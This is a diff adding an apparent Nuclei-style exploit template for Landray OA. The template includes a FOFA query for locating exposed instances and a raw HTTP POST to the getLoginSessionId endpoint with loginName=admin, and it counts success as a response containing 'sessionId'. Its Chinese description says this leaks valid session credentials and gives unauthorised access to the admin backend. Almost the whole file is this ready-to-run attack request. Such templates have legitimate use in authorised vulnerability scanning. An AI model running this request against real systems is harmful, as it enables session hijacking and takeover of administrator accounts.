@@ -1,0 +1,35 @@
+id: landray-oa-getloginsessionid-info-leak
+
+info:
+  name: "蓝凌OA getLoginSessionId 接口会话标识泄露"
+  author: 0dayPoc
+  severity: medium
+  description: |-
+    fofa: app="Landray-OA系统"
+          蓝凌OA系统在getLoginSessionId接口交互过程中未正确限制会话标识的访问权限，导致攻击者可通过该接口获取有效会话凭证。此安全缺陷允许未经授权的用户获取Session信息，从而实现对管理后台的未授权访问。
+  tags: 蓝凌OA
+
+http:
+- raw:
+  - |
+    POST /api///sys-authentication/loginService/getLoginSessionId HTTP/1.1
+    Host: {{Hostname}}
+    Cookie: JSESSIONID=97C4A7E395765306FB923C3C7FB7DB42
+    Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
+    Accept-Language: zh-CN,zh;q=0.9
+    Content-Encoding: deflate
+    Content-Disposition: attachment; filename="filename.jpg"
+    Content-Type: application/x-www-form-urlencoded
+    Cache-Control: no-cache
+    Pragma: no-cache
+    Connection: keep-alive
+
+    loginName=admin
+  matchers-condition: and
+  matchers:
+  - type: status
+    status: [200]
+  - type: word
+    part: body
+    words:
+    - 'sessionId'
